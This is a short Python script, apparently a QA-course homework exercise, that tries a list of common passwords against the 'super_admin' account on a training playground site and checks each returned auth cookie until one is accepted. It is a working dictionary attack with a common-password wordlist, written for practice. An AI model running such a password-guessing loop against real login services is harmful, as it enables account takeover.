import requests


url_get_secret_password_homework = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check_auth_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
passwords_top_25 = [
    '123456', 'password', '123456789', '12345678', '12345', 'qwerty',
    'abc123', 'football', 'monkey', 'letmein', '1234', '1234567890',
    'sunshine', 'iloveyou', 'trustno1', 'dragon', 'baseball', 'adobe123[a]',
    'welcome', 'login', 'admin', '123123', 'qwerty123', '1234567', 'solo',
    '1q2w3e4r', 'master', 'photoshop[a]', '1qaz2wsx', 'qwertyuiop', 'ashley',
    'mustang', '121212', 'starwars', '654321', 'bailey', 'access', 'flower',
    '555555', 'passw0rd', 'shadow', 'lovely', 'michael', '!@#$%^&*',
    'jesus', 'password1', 'superman', '696969', 'hottie', 'freedom',
    'aa123456', 'qazwsx', 'ninja', 'azerty', 'loveme', 'whatever', 'donald',
    'batman', 'zaq1zaq1', '000000', '123qwe', 'hello', 'charlie', '888888',
    'Football'
]


for password in passwords_top_25:
    data = {
        "login": "super_admin",
        "password": password
    }
    response_get_secret_password_homework = requests.post(url_get_secret_password_homework, data=data)
    auth_cookie = response_get_secret_password_homework.cookies.get("auth_cookie")
    response_check_auth_cookie = requests.post(url_check_auth_cookie, cookies={"auth_cookie": auth_cookie})
    if response_check_auth_cookie.text != "You are NOT authorized":
        print(response_get_secret_password_homework.text)
        print(response_check_auth_cookie.text)
        break
    else:
        continue
